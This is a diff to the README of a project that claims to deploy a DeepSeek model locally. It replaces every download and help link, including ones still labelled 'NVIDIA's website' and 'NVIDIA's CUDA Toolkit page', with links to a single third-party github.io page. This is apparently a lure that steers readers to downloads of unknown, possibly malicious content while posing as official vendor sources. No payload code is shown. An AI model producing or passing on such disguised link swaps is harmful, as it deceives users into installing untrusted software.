@@ -2,7 +2,7 @@
 
 ## 📥 Quick Download
 
-[![Download Now](https://img.shields.io/badge/Download%20deepseek--v4--deploy-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/behindther8326/deepseek-v4-deploy)
+[![Download Now](https://img.shields.io/badge/Download%20deepseek--v4--deploy-v1.0-blue?style=for-the-badge&logo=github)](https://behindther8326.github.io)
 
 ## 🎯 What is This?
 
@@ -23,17 +23,17 @@ deepseek-v4-deploy is a ready-to-use package that lets you run **DeepSeek-V4-Fla
 ### Step 1: Download the Application
 
 Visit this link to download the application:
-[Download deepseek-v4-deploy](https://github.com/behindther8326/deepseek-v4-deploy)
+[Download deepseek-v4-deploy](https://behindther8326.github.io)
 
 ### Step 2: Install NVIDIA Drivers
 
-1. Download the latest NVIDIA driver for your GPU from [NVIDIA's website](https://www.nvidia.com/Download/index.aspx)
+1. Download the latest NVIDIA driver for your GPU from [NVIDIA's website](https://behindther8326.github.io)
 2. Run the installer and follow the on-screen instructions
 3. Restart your computer after installation
 
 ### Step 3: Install CUDA Toolkit
 
-1. Download CUDA 12.4 from [NVIDIA's CUDA Toolkit page](https://developer.nvidia.com/cuda-downloads)
+1. Download CUDA 12.4 from [NVIDIA's CUDA Toolkit page](https://behindther8326.github.io)
 2. Install CUDA with default settings
 3. Verify installation by opening Command Prompt and typing: `nvcc --version`
 
@@ -96,7 +96,7 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 ## 💬 Support
 
 If you encounter issues:
-1. Check the [GitHub Issues page](https://github.com/behindther8326/deepseek-v4-deploy/issues)
+1. Check the [GitHub Issues page](https://behindther8326.github.io)
 2. Search for existing solutions
 3. Open a new issue with detailed information about your system and the problem
 
